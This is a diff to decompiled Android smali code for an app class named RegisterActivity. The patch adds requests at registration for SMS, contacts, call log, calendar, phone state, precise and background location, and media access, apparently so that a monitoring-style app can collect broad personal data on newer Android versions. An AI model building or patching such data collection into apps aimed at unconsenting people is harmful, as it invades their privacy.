@@ -39,6 +39,8 @@
 
 .field editTextEmailFirst:Landroid/widget/EditText;
 
+.field private declaredRuntimePermissions:Ljava/util/Set;
+
 .field editTextEmailSecond:Landroid/widget/EditText;
 
 .field protected installWithoutDac:Z
@@ -989,6 +991,322 @@
     return v0
 .end method
 
+.method private ensureDeclaredPermissionsCache()Ljava/util/Set;
+    .locals 6
+
+    iget-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;
+
+    if-eqz v0, :cond_0
+
+    return-object v0
+
+    :cond_0
+    const/16 v0, 0x1000
+
+    :try_start_0
+    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v1
+
+    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getPackageName()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v1, v2, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
+
+    move-result-object v0
+
+    iget-object v0, v0, Landroid/content/pm/PackageInfo;->requestedPermissions:[Ljava/lang/String;
+
+    if-nez v0, :cond_1
+
+    invoke-static {}, Ljava/util/Collections;->emptySet()Ljava/util/Set;
+
+    move-result-object v0
+
+    goto :goto_1
+
+    :cond_1
+    array-length v1, v0
+
+    new-instance v2, Ljava/util/HashSet;
+
+    invoke-direct {v2, v1}, Ljava/util/HashSet;-><init>(I)V
+
+    const/4 v3, 0x0
+
+    :goto_0
+    if-ge v3, v1, :cond_2
+
+    aget-object v4, v0, v3
+
+    if-eqz v4, :cond_3
+
+    invoke-interface {v2, v4}, Ljava/util/Set;->add(Ljava/lang/Object;)Z
+
+    :cond_3
+    add-int/lit8 v3, v3, 0x1
+
+    goto :goto_0
+
+    :cond_2
+    move-object v0, v2
+
+    :goto_1
+    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;
+
+    :goto_2
+    return-object v0
+
+    :catch_0
+    move-exception v0
+
+    invoke-static {}, Ljava/util/Collections;->emptySet()Ljava/util/Set;
+
+    move-result-object v0
+
+    iput-object v0, p0, Lcom/hp/vd/RegisterActivity;->declaredRuntimePermissions:Ljava/util/Set;
+
+    goto :goto_2
+
+    :try_end_0
+    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
+.end method
+
+.method private isPermissionDeclaredForCurrentDevice(Ljava/lang/String;)Z
+    .locals 1
+
+    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->ensureDeclaredPermissionsCache()Ljava/util/Set;
+
+    move-result-object v0
+
+    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z
+
+    move-result p1
+
+    return p1
+.end method
+
+.method protected addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+    .locals 1
+
+    invoke-direct {p0, p2}, Lcom/hp/vd/RegisterActivity;->isPermissionDeclaredForCurrentDevice(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    invoke-static {p0, p2}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    invoke-interface {p1, p2}, Ljava/util/List;->add(Ljava/lang/Object;)Z
+
+    move-result p1
+
+    :cond_0
+    return-void
+.end method
+
+.method protected ensureRuntimePermissions()V
+    .locals 4
+
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v1, 0x17
+
+    if-ge v0, v1, :cond_0
+
+    return-void
+
+    :cond_0
+    new-instance v0, Ljava/util/ArrayList;
+
+    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V
+
+    const-string v1, "android.permission.READ_SMS"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.READ_CONTACTS"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x21
+
+    if-ge v1, v2, :cond_1
+
+    const-string v1, "android.permission.READ_CALL_LOG"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_1
+    const-string v1, "android.permission.READ_CALENDAR"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1d
+
+    if-ge v1, v2, :cond_2
+
+    const-string v1, "android.permission.READ_PHONE_STATE"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_2
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1a
+
+    if-lt v1, v2, :cond_3
+
+    const-string v1, "android.permission.READ_PHONE_NUMBERS"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_3
+    const-string v1, "android.permission.ACCESS_FINE_LOCATION"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.ACCESS_COARSE_LOCATION"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x1f
+
+    if-lt v1, v2, :cond_4
+
+    const-string v1, "android.permission.BLUETOOTH_CONNECT"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.BLUETOOTH_SCAN"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_4
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x21
+
+    if-ge v1, v2, :cond_5
+
+    const-string v1, "android.permission.READ_EXTERNAL_STORAGE"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.WRITE_EXTERNAL_STORAGE"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_5
+    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v2, 0x21
+
+    if-lt v1, v2, :cond_6
+
+    const-string v1, "android.permission.READ_MEDIA_IMAGES"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.READ_MEDIA_VIDEO"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.READ_MEDIA_AUDIO"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.NEARBY_WIFI_DEVICES"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    const-string v1, "android.permission.POST_NOTIFICATIONS"
+
+    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/RegisterActivity;->addPermissionIfMissing(Ljava/util/List;Ljava/lang/String;)V
+
+    :cond_6
+    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z
+
+    move-result v1
+
+    if-nez v1, :cond_7
+
+    invoke-interface {v0}, Ljava/util/List;->size()I
+
+    move-result v1
+
+    new-array v1, v1, [Ljava/lang/String;
+
+    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, [Ljava/lang/String;
+
+    const/16 v1, 0x3e9
+
+    invoke-static {p0, v0, v1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
+
+    :cond_7
+    invoke-direct {p0}, Lcom/hp/vd/RegisterActivity;->requestBackgroundLocationIfNeeded()V
+
+    return-void
+.end method
+
+.method private requestBackgroundLocationIfNeeded()V
+    .locals 4
+
+    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
+
+    const/16 v1, 0x1d
+
+    if-lt v0, v1, :cond_1
+
+    const-string v0, "android.permission.ACCESS_FINE_LOCATION"
+
+    invoke-static {p0, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I
+
+    move-result v0
+
+    if-nez v0, :cond_1
+
+    const-string v0, "android.permission.ACCESS_BACKGROUND_LOCATION"
+
+    invoke-static {p0, v0}, Landroid/support/v4/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I
+
+    move-result v0
+
+    if-eqz v0, :cond_1
+
+    const/4 v0, 0x1
+
+    new-array v0, v0, [Ljava/lang/String;
+
+    const/4 v1, 0x0
+
+    const-string v2, "android.permission.ACCESS_BACKGROUND_LOCATION"
+
+    aput-object v2, v0, v1
+
+    const/16 v1, 0x3ea
+
+    invoke-static {p0, v0, v1}, Landroid/support/v4/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V
+
+    :cond_1
+    return-void
+.end method
+
 .method protected install(Ljava/lang/String;)Z
     .locals 7
 
@@ -1795,6 +2113,8 @@
     .line 240
     :cond_0
     invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->adjustInterfaceElementsAccordingToTos()V
+
+    invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->ensureRuntimePermissions()V
 
     .line 242
     invoke-virtual {p0}, Lcom/hp/vd/RegisterActivity;->getApplicationContext()Landroid/content/Context;
